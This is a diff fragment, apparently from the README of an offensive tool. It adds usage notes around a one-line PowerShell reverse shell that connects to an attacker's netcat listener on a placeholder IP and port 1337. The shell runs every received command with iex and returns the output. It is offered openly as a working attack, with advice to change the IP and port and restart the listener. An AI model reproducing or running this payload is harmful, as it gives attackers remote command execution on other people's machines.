@@ -45,8 +45,10 @@ send another version of the TCP Client to the client (if you use -k netcat will 
 
 Once you recieve a connexion, push the complete TCP Client to the client so you can have feedback
 on what you execute :  
-```$b=[text.encoding]::UTF8;while(1){try{;$u=(New-Object Net.Sockets.TCPClient("0.0.0.0",1337)).GetStream();$w=New-Object byte[] 65535;while(($i=$u.Read($w,0,$w.Length)) -ne 0){$d=$b.GetString($w,0,$i);$v=$b.GetBytes((iex $d 2>&1|Out-String));$u.Write($v,0,$v.Length)}}catch{}}```
+```$b=[text.encoding]::UTF8;while(1){try{;$u=(New-Object Net.Sockets.TCPClient("0.0.0.0",1337)).GetStream();$w=New-Object byte[] 65535;while(($i=$u.Read($w,0,$w.Length)) -ne 0){$d=$b.GetString($w,0,$i);$v=$b.GetBytes((iex $d 2>&1|Out-String));$u.Write($v,0,$v.Length)}}catch{}}```  
+(don't forget to replace the IP and port to fit your situation) 
 
+Restart your netcat listener so the new client version can connect to your port  
 Done! You can execute any PowerShell command and get the output in your netcat listener!
 
 ## Demo : 
